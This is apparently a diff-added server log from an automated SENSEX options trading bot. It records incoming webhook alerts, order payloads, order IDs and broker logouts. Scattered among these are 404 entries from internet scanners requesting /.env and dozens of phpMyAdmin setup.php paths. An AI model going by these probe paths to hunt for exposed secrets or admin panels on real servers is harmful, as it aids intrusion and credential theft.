+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+[I 240611 07:19:32 smart_api_client:77] OrderId: 240611000954833
+[I 240611 07:19:32 smart_api_client:77] OrderId: 240611000954854
+[I 240611 07:19:33 smart_api_client:85] Logout Successful
+2024-06-11 07:19:33,476 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:19:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:24:01,558 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:24:00Z",\n    "strategy.order.price": "76678.69",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 07:24:01,558 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:24:00Z', 'strategy.order.price': '76678.69', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 07:24:02,670 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 07:24:03 smart_api_client:77] OrderId: 240611000966464
+[I 240611 07:24:03 smart_api_client:77] OrderId: 240611000966504
+[I 240611 07:24:04 smart_api_client:85] Logout Successful
+2024-06-11 07:24:04,272 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:24:04] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:27:59,025 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:27:59] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.0[0m" 404 -
+2024-06-11 07:28:30,725 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:28:30Z",\n    "strategy.order.price": "76664.87",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 07:28:30,725 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:28:30Z', 'strategy.order.price': '76664.87', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 07:28:31,845 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 07:28:32 smart_api_client:77] OrderId: 240611000991716
+[I 240611 07:28:32 smart_api_client:77] OrderId: 240611000991761
+[I 240611 07:28:33 smart_api_client:85] Logout Successful
+2024-06-11 07:28:33,536 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:28:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:33:31,602 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:33:30Z",\n    "strategy.order.price": "76686.52",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 07:33:31,602 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:33:30Z', 'strategy.order.price': '76686.52', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 07:33:32,794 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 07:33:33 smart_api_client:77] OrderId: 240611001007235
+[I 240611 07:33:33 smart_api_client:77] OrderId: 240611001007258
+[I 240611 07:33:34 smart_api_client:85] Logout Successful
+2024-06-11 07:33:34,452 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:33:34] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:45:01,563 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:45:00Z",\n    "strategy.order.price": "76679.40000000001",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 07:45:01,563 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:45:00Z', 'strategy.order.price': '76679.40000000001', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 07:45:02,930 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 07:45:03 smart_api_client:77] OrderId: 240611001036368
+[I 240611 07:45:03 smart_api_client:77] OrderId: 240611001036398
+[I 240611 07:45:04 smart_api_client:85] Logout Successful
+2024-06-11 07:45:04,543 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:45:04] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:50:03,164 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:50:00Z",\n    "strategy.order.price": "76697.27",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 07:50:03,164 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:50:00Z', 'strategy.order.price': '76697.27', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 07:50:04,355 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 07:50:04 smart_api_client:77] OrderId: 240611001051701
+[I 240611 07:50:05 smart_api_client:77] OrderId: 240611001051738
+[I 240611 07:50:05 smart_api_client:85] Logout Successful
+2024-06-11 07:50:05,948 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:50:05] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:03:30,824 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T08:03:30Z",\n    "strategy.order.price": "76721.75",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 08:03:30,824 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T08:03:30Z', 'strategy.order.price': '76721.75', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 08:03:32,096 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 08:03:32 smart_api_client:77] OrderId: 240611001099028
+[I 240611 08:03:33 smart_api_client:77] OrderId: 240611001099053
+[I 240611 08:03:33 smart_api_client:85] Logout Successful
+2024-06-11 08:03:33,649 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:03:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:04:00,889 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T08:04:00Z",\n    "strategy.order.price": "76733.04000000001",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 08:04:00,890 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T08:04:00Z', 'strategy.order.price': '76733.04000000001', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 08:04:01,999 - __main__ - INFO - tradingsymbol: SENSEX2461476800PE
+[I 240611 08:04:02 smart_api_client:77] OrderId: 240611001100622
+[I 240611 08:04:03 smart_api_client:77] OrderId: 240611001100645
+[I 240611 08:04:03 smart_api_client:85] Logout Successful
+2024-06-11 08:04:03,524 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:04:03] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:06:00,208 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:06:00] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 08:23:02,164 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T08:23:00Z",\n    "strategy.order.price": "76783.27",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 08:23:02,164 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T08:23:00Z', 'strategy.order.price': '76783.27', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 08:23:03,425 - __main__ - INFO - tradingsymbol: SENSEX2461476700CE
+[I 240611 08:23:03 smart_api_client:77] OrderId: 240611001174628
+[I 240611 08:23:04 smart_api_client:77] OrderId: 240611001174659
+[I 240611 08:23:04 smart_api_client:85] Logout Successful
+2024-06-11 08:23:04,979 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:23:04] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:26:57,208 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:26:57] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 08:26:57,289 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:26:57] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 08:29:00,814 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T08:29:00Z",\n    "strategy.order.price": "76812.43000000001",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 08:29:00,815 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T08:29:00Z', 'strategy.order.price': '76812.43000000001', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 08:29:02,006 - __main__ - INFO - tradingsymbol: SENSEX2461476800PE
+[I 240611 08:29:02 smart_api_client:77] OrderId: 240611001196624
+[I 240611 08:29:03 smart_api_client:77] OrderId: 240611001196657
+[I 240611 08:29:03 smart_api_client:85] Logout Successful
+2024-06-11 08:29:03,513 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:29:03] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:31:31,071 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T08:31:30Z",\n    "strategy.order.price": "76785.48",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 08:31:31,071 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T08:31:30Z', 'strategy.order.price': '76785.48', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 08:31:32,161 - __main__ - INFO - tradingsymbol: SENSEX2461476800CE
+[I 240611 08:31:32 smart_api_client:77] OrderId: 240611001204102
+[I 240611 08:31:33 smart_api_client:77] OrderId: 240611001204126
+[I 240611 08:31:33 smart_api_client:85] Logout Successful
+2024-06-11 08:31:33,666 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:31:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:34:40,175 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:34:40] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 08:34:40,432 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:34:40] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 08:55:00,831 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T08:55:00Z",\n    "strategy.order.price": "76683.65000000001",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 08:55:00,831 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T08:55:00Z', 'strategy.order.price': '76683.65000000001', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 08:55:02,107 - __main__ - INFO - tradingsymbol: SENSEX2461476800PE
+[I 240611 08:55:02 smart_api_client:77] OrderId: 240611001316833
+[I 240611 08:55:03 smart_api_client:77] OrderId: 240611001316869
+[I 240611 08:55:03 smart_api_client:85] Logout Successful
+2024-06-11 08:55:03,672 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:55:03] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 08:57:47,494 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:47] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:47,831 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:47] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:48,615 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:48] "[33mGET /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:48,948 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:48] "[33mGET /phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:49,262 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:49] "[33mGET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:49,556 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:49] "[33mGET /phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:49,868 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:49] "[33mGET /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:50,194 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:50] "[33mGET /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:50,517 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:50] "[33mGET /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:50,828 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:50] "[33mGET /phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:51,109 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:51] "[33mGET /phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:54,421 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:54] "[33mGET /phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:54,739 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:54] "[33mGET /pma/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:55,050 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:55] "[33mGET /phpMyAdmin3/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:55,867 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:55] "[33mGET /myadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:56,210 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:56] "[33mGET /MyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:57,525 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:57] "[33mGET /PHPMYADMIN/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:57,819 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:57] "[33mGET /mysqladmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:57:58,136 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:57:58] "[33mGET /SQL/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:01,478 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:01] "[33mGET /phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:01,806 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:01] "[33mGET /phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:02,132 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:02] "[33mGET /phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:02,451 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:02] "[33mGET /phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:02,755 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:02] "[33mGET /admin/pma/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:03,060 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:03] "[33mGET /phpMyAdmin-2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:03,361 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:03] "[33mGET /web/phpMyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:04,714 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:04] "[33mGET /webadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:05,035 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:05] "[33mGET /admin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:05,377 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:05] "[33mGET /dbadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:08,714 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:08] "[33mGET /mysql/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:09,027 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:09] "[33mGET /phpMyAdmin2/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:09,367 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:09] "[33mGET /phpma/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:13,101 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:13] "[33mGET /sqlweb/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:13,406 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:13] "[33mGET /webdb/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:13,738 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:13] "[33mGET /websql/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:14,050 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:14] "[33mGET /_phpMyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:14,367 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:14] "[33mGET /php/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:15,135 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:15] "[33mGET /admin/phpmyadmin/scripts/setup.txt HTTP/1.0[0m" 404 -
+2024-06-11 08:58:15,436 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:15] "[33mGET /db/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:15,748 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:15] "[33mGET /sqlmanager/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:16,086 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:16] "[33mGET /mysqlmanager/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:16,400 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:16] "[33mGET /phpmanager/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:17,087 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:17] "[33mGET /php-myadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:17,399 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:17] "[33mGET /phpmy-admin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 08:58:17,737 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 08:58:17] "[33mGET /mysql-admin/scripts/setup.php HTTP/1.0[0m" 404 -
+2024-06-11 09:05:31,994 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:05:30Z",\n    "strategy.order.price": "76661.36",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 09:05:31,994 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:05:30Z', 'strategy.order.price': '76661.36', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 09:05:33,159 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 09:05:33 smart_api_client:77] OrderId: 240611001358378
+[I 240611 09:05:34 smart_api_client:77] OrderId: 240611001358423
+[I 240611 09:05:34 smart_api_client:85] Logout Successful
+2024-06-11 09:05:34,694 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:05:34] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:06:30,921 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:06:30Z",\n    "strategy.order.price": "76699.05",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 09:06:30,921 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:06:30Z', 'strategy.order.price': '76699.05', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 09:06:31,962 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 09:06:32 smart_api_client:77] OrderId: 240611001362195
+[I 240611 09:06:32 smart_api_client:77] OrderId: 240611001362227
+[I 240611 09:06:33 smart_api_client:85] Logout Successful
+2024-06-11 09:06:33,485 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:06:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:08:01,689 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:08:00Z",\n    "strategy.order.price": "76671.36",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 09:08:01,690 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:08:00Z', 'strategy.order.price': '76671.36', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 09:08:02,783 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 09:08:03 smart_api_client:77] OrderId: 240611001367112
+[I 240611 09:08:03 smart_api_client:77] OrderId: 240611001367167
+[I 240611 09:08:04 smart_api_client:85] Logout Successful
+2024-06-11 09:08:04,353 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:08:04] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:12:00,561 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:12:00Z",\n    "strategy.order.price": "76683.2",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 09:12:00,561 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:12:00Z', 'strategy.order.price': '76683.2', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 09:12:01,652 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 09:12:02 smart_api_client:77] OrderId: 240611001380535
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
